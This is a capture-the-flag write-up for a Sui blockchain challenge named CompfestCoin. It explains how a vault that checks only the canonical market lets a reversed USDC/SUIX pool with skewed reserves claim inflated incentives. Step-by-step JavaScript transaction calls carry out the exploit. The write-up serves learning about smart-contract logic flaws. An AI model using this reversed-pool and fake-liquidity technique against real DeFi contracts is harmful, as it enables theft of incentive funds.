---
title: "CompfestCoin"
ctf: "Compfest18"
date: 2026-08-29
category: blockchain
difficulty: unknown
points: unknown
flag_format: "challenge-specific"
author: ""
---

# CompfestCoin

## Summary

The challenge checks whether an `OperatorAccount<CFX>` has earned the bounty target. The vault accepts any registered strategy whose market matches the canonical `SUIX/USDC` market, so a reversed `USDC/SUIX` pool can be created with an artificially high quote/base ratio.

The pool score is capped by the vault balance. Creating the pool with reserves `(1, 2_000_000)` makes the claim equal to `1000`, which satisfies the account qualification requirement.

## Solution

### 1. Register a usable strategy witness

`register_route_strategy` requires a generic witness with `drop`. The original solver used `CFX`, but `CFX` has no `copy` ability and the RPC rejected the empty pure argument with `InvalidUsageOfPureArg`.

`0x1::option::Option<u8>` has both `copy` and `drop`, so it can be passed as `Option::None` and used as the strategy type. The vault only checks the strategy's registered market, not the concrete strategy type.

```js
const STRATEGY = '0x1::option::Option<u8>';

tx.moveCall({
  target: `${PACKAGE_ID}::registry::register_route_strategy`,
  typeArguments: [USDC, SUIX, STRATEGY],
  arguments: [
    tx.object(REGISTRY),
    tx.pure.option('u8', null),
  ],
});
```

### 2. Create a high-scoring reversed pool

The registry initially contains the direct `SUIX/USDC` market. Using the reversed type order creates a new direct market while its canonical market remains compatible with the vault.

```js
tx.moveCall({
  target: `${PACKAGE_ID}::pool::create_route_pool`,
  typeArguments: [USDC, SUIX],
  arguments: [
    tx.object(REGISTRY),
    tx.object(CONFIG),
    tx.pure.u64(1),
    tx.pure.u64(2_000_000),
  ],
});
```

Open a position, add fake liquidity, then claim the incentives:

```js
tx.moveCall({
  target: `${PACKAGE_ID}::pool::open_position`,
  typeArguments: [USDC, SUIX],
  arguments: [tx.object(poolId)],
});

tx.moveCall({
  target: `${PACKAGE_ID}::pool::add_liquidity`,
  typeArguments: [USDC, SUIX],
  arguments: [
    tx.object(poolId), tx.object(positionId),
    tx.pure.u64(500), tx.object(CONFIG),
  ],
});

tx.moveCall({
  target: `${PACKAGE_ID}::vault::claim_route_incentives`,
  typeArguments: [USDC, SUIX, STRATEGY],
  arguments: [
    tx.object(VAULT), tx.object(poolId), tx.object(strategyId),
    tx.object(positionId), tx.object(ACCOUNT), tx.object(ORACLE),
    tx.object(CONFIG),
  ],
});
```

Finally call `setup::solve` with the qualified account. The fixed solver is available in [exploit.mjs](./exploit.mjs).

## Verification

The transaction completed successfully with:

```text
account.earned = 1000
setup.solved = true
```

No private key or RPC credential is included in this write-up. They should be supplied through local environment variables when reproducing the solve.

## Flag

The challenge instance reports completion through `setup.solved = true`; the platform flag should be collected from the challenge interface after submitting the solved instance.
